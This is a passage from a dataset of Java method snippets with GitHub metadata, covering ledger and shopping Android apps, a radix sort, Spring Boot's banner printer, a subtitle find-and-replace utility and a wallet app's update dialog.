dr.child(ss).child(\"Transactions\").child(\"take money\").child(sst).child(remark.getText().toString()).setValue(money.getText().toString());\n                                dr.child(sst).child(\"Transactions\").child(\"give money\").child(ss).child(remark.getText().toString()).setValue(money.getText().toString());\n                                requestDialog.dismiss();\n                                getActivity().getSupportFragmentManager().popBackStack();\n                                getActivity().getSupportFragmentManager().beginTransaction().replace(R.id.main_hu_container,new home_fragment()).commit();\n\n                            }\n                        });\n                        c_name.setText(sst);\n                        c_no.setText(data.get(sst));\n                        TextDrawable drawable = TextDrawable.builder().buildRound(sst.substring(0,1).toUpperCase(), Color.GREEN);\n                        c_img.setBackground(drawable);\n                        requestDialog.show();\n\n                    }\n                    else{\n                        Toast.makeText(getActivity().getApplicationContext(),\"Coantact Not Found\",Toast.LENGTH_SHORT).show();\n                    }\n                }\n\n            }\n        });\n     return rootView;\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/Contact_Fragment.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 55045, "method_name": "saveUser", "class_name": "PrefChangePhone", "params": ["User", "Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveUser(User user, Context context)\n    {\n\n        //Creating a shared preference\n\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n\n        SharedPreferences.Editor prefsEditor = sharedPref.edit();\n\n        Gson gson = UtilityFunctions.provideGson();\n        String json = gson.toJson(user);\n        prefsEditor.putString(TAG_CHANGE_PHONE, json);\n\n        prefsEditor.apply();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/EditDataScreens/EditProfile/ChangePhone/PrefChangePhone.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55046, "method_name": "getUser", "class_name": "PrefChangePhone", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "User", "snippet": "    public static User getUser(Context context)\n    {\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n\n        Gson gson = UtilityFunctions.provideGson();\n        String json = sharedPref.getString(TAG_CHANGE_PHONE, null);\n\n        return gson.fromJson(json, User.class);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/EditDataScreens/EditProfile/ChangePhone/PrefChangePhone.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55047, "method_name": "insert", "class_name": "CommentRepositoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void insert() {\n        // given\n        Comment comment = this.comments.get(0);\n\n        // when\n        Comment actual = this.sut.save(comment);\n\n        // then\n        assertThat(actual.getVersion()).isEqualTo(1L);\n        assertThat(comment.getContent()).isSameAs(actual.getContent());\n\n        Optional<Comment> load = this.sut.findById(comment.getId());\n        assertThat(load).isPresent();\n        assertThat(load.get().getCreatedBy()).isEqualTo(this.creatorId);\n        assertThat(load.get().getContent()).isNotNull();\n        assertThat(load.get().getContent().getBody()).isEqualTo(\"comment 1\");\n        assertThat(load.get().getContent().getMimeType()).isEqualTo(\"text/plain\");\n    }", "url": "https://raw.githubusercontent.com/mhyeon-lee/spring-data-sample-codes/master/spring-data-jdbc-plus-sql-groovy-sample/src/test/java/com/navercorp/spring/sql/groovy/comment/CommentRepositoryTest.java", "stars": "52", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55048, "method_name": "radixSort", "class_name": "Code04_RadixSort", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void radixSort(int[] arr) {\n\t\tif (arr == null || arr.length < 2) {\n\t\t\treturn;\n\t\t}\n\t\tradixSort(arr, 0, arr.length - 1, maxbits(arr));\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55049, "method_name": "maxbits", "class_name": "Code04_RadixSort", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int maxbits(int[] arr) {\n\t\tint max = Integer.MIN_VALUE;\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tmax = Math.max(max, arr[i]);\n\t\t}\n\t\tint res = 0;\n\t\twhile (max != 0) {\n\t\t\tres++;\n\t\t\tmax /= 10;\n\t\t}\n\t\treturn res;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55050, "method_name": "radixSort", "class_name": "Code04_RadixSort", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void radixSort(int[] arr, int L, int R, int digit) {\n\t\tfinal int radix = 10;\n\t\tint i = 0, j = 0;\n\t\t// \u6709\u591a\u5c11\u4e2a\u6570\u51c6\u5907\u591a\u5c11\u4e2a\u8f85\u52a9\u7a7a\u95f4\n\t\tint[] help = new int[R - L + 1];\n\t\tfor (int d = 1; d <= digit; d++) { // \u6709\u591a\u5c11\u4f4d\u5c31\u8fdb\u51fa\u51e0\u6b21\n\t\t\t// 10\u4e2a\u7a7a\u95f4\n\t\t    // count[0] \u5f53\u524d\u4f4d(d\u4f4d)\u662f0\u7684\u6570\u5b57\u6709\u591a\u5c11\u4e2a\n\t\t\t// count[1] \u5f53\u524d\u4f4d(d\u4f4d)\u662f(0\u548c1)\u7684\u6570\u5b57\u6709\u591a\u5c11\u4e2a\n\t\t\t// count[2] \u5f53\u524d\u4f4d(d\u4f4d)\u662f(0\u30011\u548c2)\u7684\u6570\u5b57\u6709\u591a\u5c11\u4e2a\n\t\t\t// count[i] \u5f53\u524d\u4f4d(d\u4f4d)\u662f(0~i)\u7684\u6570\u5b57\u6709\u591a\u5c11\u4e2a\n\t\t\tint[] count = new int[radix]; // count[0..9]\n\t\t\tfor (i = L; i <= R; i++) {\n\t\t\t\t// 103  1   3\n\t\t\t\t// 209  1   9\n\t\t\t\tj = getDigit(arr[i], d);\n\t\t\t\tcount[j]++;\n\t\t\t}\n\t\t\tfor (i = 1; i < radix; i++) {\n\t\t\t\tcount[i] = count[i] + count[i - 1];\n\t\t\t}\n\t\t\tfor (i = R; i >= L; i--) {\n\t\t\t\tj = getDigit(arr[i], d);\n\t\t\t\thelp[count[j] - 1] = arr[i];\n\t\t\t\tcount[j]--;\n\t\t\t}\n\t\t\tfor (i = L, j = 0; i <= R; i++, j++) {\n\t\t\t\tarr[i] = help[j];\n\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55051, "method_name": "getDigit", "class_name": "Code04_RadixSort", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int getDigit(int x, int d) {\n\t\treturn ((x / ((int) Math.pow(10, d - 1))) % 10);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55052, "method_name": "comparator", "class_name": "Code04_RadixSort", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void comparator(int[] arr) {\n\t\tArrays.sort(arr);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55053, "method_name": "generateRandomArray", "class_name": "Code04_RadixSort", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int[] generateRandomArray(int maxSize, int maxValue) {\n\t\tint[] arr = new int[(int) ((maxSize + 1) * Math.random())];\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tarr[i] = (int) ((maxValue + 1) * Math.random());\n\t\t}\n\t\treturn arr;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55054, "method_name": "copyArray", "class_name": "Code04_RadixSort", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int[] copyArray(int[] arr) {\n\t\tif (arr == null) {\n\t\t\treturn null;\n\t\t}\n\t\tint[] res = new int[arr.length];\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tres[i] = arr[i];\n\t\t}\n\t\treturn res;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55055, "method_name": "isEqual", "class_name": "Code04_RadixSort", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isEqual(int[] arr1, int[] arr2) {\n\t\tif ((arr1 == null && arr2 != null) || (arr1 != null && arr2 == null)) {\n\t\t\treturn false;\n\t\t}\n\t\tif (arr1 == null && arr2 == null) {\n\t\t\treturn true;\n\t\t}\n\t\tif (arr1.length != arr2.length) {\n\t\t\treturn false;\n\t\t}\n\t\tfor (int i = 0; i < arr1.length; i++) {\n\t\t\tif (arr1[i] != arr2[i]) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55056, "method_name": "printArray", "class_name": "Code04_RadixSort", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void printArray(int[] arr) {\n\t\tif (arr == null) {\n\t\t\treturn;\n\t\t}\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tSystem.out.print(arr[i] + \" \");\n\t\t}\n\t\tSystem.out.println();\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55057, "method_name": "main", "class_name": "Code04_RadixSort", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint testTime = 500000;\n\t\tint maxSize = 100;\n\t\tint maxValue = 100000;\n\t\tboolean succeed = true;\n\t\tfor (int i = 0; i < testTime; i++) {\n\t\t\tint[] arr1 = generateRandomArray(maxSize, maxValue);\n\t\t\tint[] arr2 = copyArray(arr1);\n\t\t\tradixSort(arr1);\n\t\t\tcomparator(arr2);\n\t\t\tif (!isEqual(arr1, arr2)) {\n\t\t\t\tsucceed = false;\n\t\t\t\tprintArray(arr1);\n\t\t\t\tprintArray(arr2);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(succeed ? \"Nice!\" : \"Fucking fucked!\");\n\n\t\tint[] arr = generateRandomArray(maxSize, maxValue);\n\t\tprintArray(arr);\n\t\tradixSort(arr);\n\t\tprintArray(arr);\n\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class05/Code04_RadixSort.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55058, "method_name": "print", "class_name": "SpringApplicationBannerPrinter", "params": ["Environment", "Class<?>", "Log"], "throws": null, "modifiers": [], "return_type": "Banner", "snippet": "\tBanner print(Environment environment, Class<?> sourceClass, Log logger) {\n\t\tBanner banner = getBanner(environment);\n\t\ttry {\n\t\t\tlogger.info(createStringFromBanner(banner, environment, sourceClass));\n\t\t}\n\t\tcatch (UnsupportedEncodingException ex) {\n\t\t\tlogger.warn(\"Failed to create String for banner\", ex);\n\t\t}\n\t\treturn new PrintedBanner(banner, sourceClass);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55059, "method_name": "print", "class_name": "SpringApplicationBannerPrinter", "params": ["Environment", "Class<?>", "PrintStream"], "throws": null, "modifiers": [], "return_type": "Banner", "snippet": "\tBanner print(Environment environment, Class<?> sourceClass, PrintStream out) {\n\t\tBanner banner = getBanner(environment);\n\t\tbanner.printBanner(environment, sourceClass, out);\n\t\treturn new PrintedBanner(banner, sourceClass);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55060, "method_name": "getBanner", "class_name": "SpringApplicationBannerPrinter", "params": ["Environment"], "throws": null, "modifiers": ["private"], "return_type": "Banner", "snippet": "\tprivate Banner getBanner(Environment environment) {\n\t\tBanners banners = new Banners();\n\t\tbanners.addIfNotNull(getImageBanner(environment));\n\t\tbanners.addIfNotNull(getTextBanner(environment));\n\t\tif (banners.hasAtLeastOneBanner()) {\n\t\t\treturn banners;\n\t\t}\n\t\tif (this.fallbackBanner != null) {\n\t\t\treturn this.fallbackBanner;\n\t\t}\n\t\treturn DEFAULT_BANNER;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55061, "method_name": "getTextBanner", "class_name": "SpringApplicationBannerPrinter", "params": ["Environment"], "throws": null, "modifiers": ["private"], "return_type": "Banner", "snippet": "\tprivate Banner getTextBanner(Environment environment) {\n\t\tString location = environment.getProperty(BANNER_LOCATION_PROPERTY, DEFAULT_BANNER_LOCATION);\n\t\tResource resource = this.resourceLoader.getResource(location);\n\t\tif (resource.exists()) {\n\t\t\treturn new ResourceBanner(resource);\n\t\t}\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55062, "method_name": "getImageBanner", "class_name": "SpringApplicationBannerPrinter", "params": ["Environment"], "throws": null, "modifiers": ["private"], "return_type": "Banner", "snippet": "\tprivate Banner getImageBanner(Environment environment) {\n\t\tString location = environment.getProperty(BANNER_IMAGE_LOCATION_PROPERTY);\n\t\tif (StringUtils.hasLength(location)) {\n\t\t\tResource resource = this.resourceLoader.getResource(location);\n\t\t\treturn resource.exists() ? new ImageBanner(resource) : null;\n\t\t}\n\t\tfor (String ext : IMAGE_EXTENSION) {\n\t\t\tResource resource = this.resourceLoader.getResource(\"banner.\" + ext);\n\t\t\tif (resource.exists()) {\n\t\t\t\treturn new ImageBanner(resource);\n\t\t\t}\n\t\t}\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55063, "method_name": "createStringFromBanner", "class_name": "SpringApplicationBannerPrinter", "params": ["Banner", "Environment", "Class<?>"], "throws": ["UnsupportedEncodingException"], "modifiers": ["private"], "return_type": "String", "snippet": "\tprivate String createStringFromBanner(Banner banner, Environment environment, Class<?> mainApplicationClass)\n\t\t\tthrows UnsupportedEncodingException {\n\t\tByteArrayOutputStream baos = new ByteArrayOutputStream();\n\t\tbanner.printBanner(environment, mainApplicationClass, new PrintStream(baos));\n\t\tString charset = environment.getProperty(\"spring.banner.charset\", \"UTF-8\");\n\t\treturn baos.toString(charset);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55064, "method_name": "addIfNotNull", "class_name": "Banners", "params": ["Banner"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\t\tvoid addIfNotNull(Banner banner) {\n\t\t\tif (banner != null) {\n\t\t\t\tthis.banners.add(banner);\n\t\t\t}\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": ["Banner"], "modifiers": ["static", "private"]}}, {"id": 55065, "method_name": "hasAtLeastOneBanner", "class_name": "Banners", "params": [], "throws": null, "modifiers": [], "return_type": "boolean", "snippet": "\t\tboolean hasAtLeastOneBanner() {\n\t\t\treturn !this.banners.isEmpty();\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": ["Banner"], "modifiers": ["static", "private"]}}, {"id": 55066, "method_name": "printBanner", "class_name": "Banners", "params": ["Environment", "Class<?>", "PrintStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void printBanner(Environment environment, Class<?> sourceClass, PrintStream out) {\n\t\t\tfor (Banner banner : this.banners) {\n\t\t\t\tbanner.printBanner(environment, sourceClass, out);\n\t\t\t}\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": ["Banner"], "modifiers": ["static", "private"]}}, {"id": 55067, "method_name": "printBanner", "class_name": "PrintedBanner", "params": ["Environment", "Class<?>", "PrintStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void printBanner(Environment environment, Class<?> sourceClass, PrintStream out) {\n\t\t\tsourceClass = (sourceClass != null) ? sourceClass : this.sourceClass;\n\t\t\tthis.banner.printBanner(environment, sourceClass, out);\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/SpringApplicationBannerPrinter.java", "stars": "47572", "class_props": {"extends": null, "implements": ["Banner"], "modifiers": ["static", "private"]}}, {"id": 55068, "method_name": "find", "class_name": "FindReplaceUtil", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Boolean", "snippet": "    private Boolean find(){\n        boolean state=false;\n        \n        ArrayList<Integer> res=new editUtil().changPos(edit.getText(),edit.getCaretPosition());\n        int line=res.get(0)-1; int pos=res.get(1)-1;\n        \n\n        /*\u4ece\u8d77\u59cb\u4f4d\u7f6e\u5411\u4e0b\u641c\u7d22*/\n        for(int i=line;i<list.length;i++){\n            if(i==line){\n                Pending=list[i].substring(pos,list[i].length());\n               \n            }else\n                Pending=list[i];\n            \n            if(get()){\n                state=true;\n                posRow=i;\n                break;\n            }\n        }\n        /*\u4ece\u5f00\u59cb\u5411\u8d77\u59cb\u4f4d\u7f6e\u641c\u7d22*/\n        if(!state)/*\u4ece\u8d77\u59cb\u4f4d\u7f6e\u5411\u4e0b\u641c\u7d22\u672a\u627e\u5230\uff0c\u6b64\u65f6\u8ba1\u6570\u5668\u5f52\u96f6*/\n            counter=0;\n        for(int i=0;i<=line;i++){\n            if(state){\n                if(i==line)\n                    counter+=list[i].substring(0,pos).length();\n                else\n                    counter+=list[i].length()+1;\n            }else {\n\n\n                Pending=list[i];\n               \n                if(get()){\n                    state=true;\n                    posRow=i;\n                    return state;\n                }\n\n            }\n        }\n        \n        return state;\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/util/FindReplaceUtil.java", "stars": "151", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55069, "method_name": "get", "class_name": "FindReplaceUtil", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean get(){\n        /*\u5982\u5f00\u542f\u4e86\u8fc7\u6ee4\u65f6\u95f4\u8f74\uff0c\u6821\u9a8c\u5e76\u8df3\u8fc7\u65f6\u95f4\u8f74\u884c*/\n        if(filterState&&new TimelineUtil(controller.inputset.getSubType()).TimelineCheck(Pending)){\n            counter+=Pending.length()+1;\n            return false;\n        }\n        /*\u5982\u672a\u5f00\u542f\u533a\u5206\u5927\u5c0f\u5199\uff0c\u7edf\u4e00\u8f6c\u6362\u4e3a\u5c0f\u5199*/\n        if(!caseState){\n            Pending=Pending.toLowerCase();\n            if(!regState)\n                target=target.toLowerCase();\n        }\n        /*\u5982\u5f00\u542f\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5219\u641c\u7d22\u4f7f\u7528\u8be5\u6b63\u5219*/\n        if(!regState)\n            pattern=\"(.*?)(\"+target+\")\";\n        /*\u4f7f\u7528\u6b63\u5219\u8fdb\u884c\u641c\u7d22*/\n        r = Pattern.compile(pattern);\n        m = r.matcher(Pending);\n        if(!m.find()){\n            counter+=Pending.length()+1;\n            return false;\n        }\n        else{\n            \n            if(regState){\n                \n                target = m.group();\n                posCol=m.end();\n            }\n            else\n                posCol=m.end(2);\n\n            counter+=posCol;\n            posCol-=target.length();\n            return true;\n        }\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/util/FindReplaceUtil.java", "stars": "151", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55070, "method_name": "search", "class_name": "FindReplaceUtil", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean search(){\n        boolean state=find();\n        if(state)\n            edit.selectRange(counter-target.length(),counter);\n        \n        return state;\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/util/FindReplaceUtil.java", "stars": "151", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55071, "method_name": "replace", "class_name": "FindReplaceUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean replace(String ReplaceTarget){\n        this.ReplaceTarget=ReplaceTarget;\n        String str=\"\";\n        boolean state=find();\n        if(state){\n            \n            for(int i=0;i<list.length;i++){\n                if(i==posRow){\n                    String before,after=\"\";\n                    before=list[i].substring(0,posCol);\n                    after=list[i].substring(posCol,list[i].length());\n                    String temp=before+r.matcher(after).replaceFirst(ReplaceTarget)+\"\\n\";\n                    str+=temp;\n                    System.out.println(\"\u66ff\u6362\u540e\u7684\u884c\uff1a\"+temp);\n                }else\n                    str+=list[i]+\"\\n\";\n        }\n            edit.setText(str);\n            edit.selectRange(counter-target.length(),counter-target.length()+ReplaceTarget.length());\n        }\n        return state;\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/util/FindReplaceUtil.java", "stars": "151", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55072, "method_name": "replaceAll", "class_name": "FindReplaceUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean replaceAll(String ReplaceTarget){\n        this.ReplaceTarget=ReplaceTarget;\n        String str=\"\";\n        boolean state=find();\n        if(state){\n            str=edit.getText().replaceAll(target,ReplaceTarget);\n            edit.setText(str);\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/util/FindReplaceUtil.java", "stars": "151", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55073, "method_name": "subscribeUpdateChecking", "class_name": "UpdatingHelper", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void subscribeUpdateChecking() {\n        if (updatingViewModel.getUpdateManifest().getValue() != null) {\n            UpdateManifest manifest = updatingViewModel.getUpdateManifest().getValue();\n            onUpdatingDetect(manifest);\n        } else {\n            updatingViewModel.getUpdateManifest().observe(mActivity, updateManifest -> {\n                if (updateManifest != null) {\n                    onUpdatingDetect(updateManifest);\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/views/UpdatingHelper.java", "stars": "13", "class_props": {"extends": null, "implements": ["OnBatteryChangeListener"], "modifiers": ["public"]}}, {"id": 55074, "method_name": "onUpdatingDetect", "class_name": "UpdatingHelper", "params": ["UpdateManifest"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onUpdatingDetect(UpdateManifest manifest) {\n        BatteryManager manager = (BatteryManager) mActivity.getSystemService(BATTERY_SERVICE);\n        int percent = batteryPercent != -1 ? batteryPercent :\n                Objects.requireNonNull(manager).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);\n\n        ModalDialog dialog = new ModalDialog();\n\n        UpdateHintModalBinding binding = DataBindingUtil.inflate(LayoutInflater.from(mActivity),\n                R.layout.update_hint_modal, null, false);\n\n        dialog.setBinding(binding);\n        binding.close.setOnClickListener(v -> dialog.dismiss());\n        binding.footer.setVisibility(proactive ? View.GONE : View.VISIBLE);\n        binding.subTitle.setText(mActivity.getString(R.string.new_version_hint_message,\n                getDisplayVersion(manifest)));\n        if (percent < UpdatingViewModel.MIN_BATTERY_FOR_UPDATE) {\n            String batterHint = mActivity.getString(R.string.update_alert_boot_low_battery_message,\n                    UpdatingViewModel.MIN_BATTERY_FOR_UPDATE + \"%\", percent +\"%\");\n            binding.subTitle.setText(batterHint);\n            binding.confirm.setText(R.string.know);\n            binding.footer.setVisibility(View.GONE);\n            binding.confirm.setOnClickListener(v -> dialog.dismiss());\n        } else {\n            binding.confirm.setOnClickListener(v -> {\n                dialog.dismiss();\n                AuthenticateModal.show(mActivity,\n                        mActivity.getString(R.string.password_modal_title),\n                        \"\",\n                        password->{\n                            updatingViewModel.doUpdate(password.password);\n                            subscribeUpdateState();\n                        },\n                         () -> {\n                            Bundle data = new Bundle();\n                            data.putInt(KEY_NAV_ID, R.id.action_to_setPasswordFragment1);\n                            Navigation.findNavController(mActivity, R.id.nav_host_fragment)\n                                    .navigate(R.id.action_to_verifyMnemonic, data);\n                        }\n                        );\n            });\n\n        }\n        dialog.show(mActivity.getSupportFragmentManager(), \"\");\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/views/UpdatingHelper.java", "stars": "13", "class_props": {"extends": null, "implements": ["OnBatteryChangeListener"], "modifiers": ["public"]}}, {"id": 55075, "method_name": "getDisplayVersion", "class_name": "UpdatingHelper", "params": ["UpdateManifest"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getDisplayVersion(UpdateManifest manifest) {\n        if (manifest == null) {\n            return \"\";\n        } else if(manifest.app != null) {\n            return manifest.app.displayVersion;\n        } else if(manifest.system != null) {\n            return manifest.system.displayVersion;\n        } else {\n            return \"\";\n        }\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/views/UpdatingHelper.java", "stars": "13", "class_props": {"extends": null, "implements": ["OnBatteryChangeListener"], "modifiers": ["public"]}}, {"id": 55076, "method_name": "subscribeUpdateState", "class_name": "UpdatingHelper", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void subscribeUpdateState() {\n        ModalDialog dialog = new ModalDialog();\n        UpdatingBinding binding = DataBindingUtil.inflate(LayoutInflater.from(mActivity),\n                R.layout.updating, null, false);\n        dialog.setBinding(binding);\n        updatingViewModel.getUpdatingState().observe(mActivity, updatingState -> {\n            switch (updatingState) {\n                case UPDATING:\n                    dialog.show(mActivity.getSupportFragmentManager(), \"\");\n                    break;\n                case UPDATING_SUCCESS:\n                case UPDATING_FAILED:\n                    if (dialog.getDialog() != null && dialog.getDialog().isShowing()) {\n                        dialog.dismiss();\n                    }\n                    new Handler().postDelayed(this::restartApplication, 2000);\n                    break;\n                default:\n                    break;\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/views/UpdatingHelper.java", "stars": "13", "class_props": {"extends": null, "implements": ["OnBatteryChangeListener"], "modifiers": ["public"]}}, {"id": 55077, "method_name": "restartApplication", "class_name": "UpdatingHelper", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void restartApplication() {\n        final Intent intent = mActivity.getPackageManager().getLaunchIntentForPackage(mActivity.getPackageName());\n        Objects.requireNonNull(intent).addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);\n        mActivity.startActivity(intent);\n        android.os.Process.killProcess(android.os.Process.myPid());\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/views/UpdatingHelper.java", "stars": "13", "class_props": {"extends": null, "implements": ["OnBatteryChangeListener"], "modifiers": ["public"]}}, {"id": 55078, "method_name": "onBatteryChange", "class_name": "UpdatingHelper", "params": ["int"], "throws": 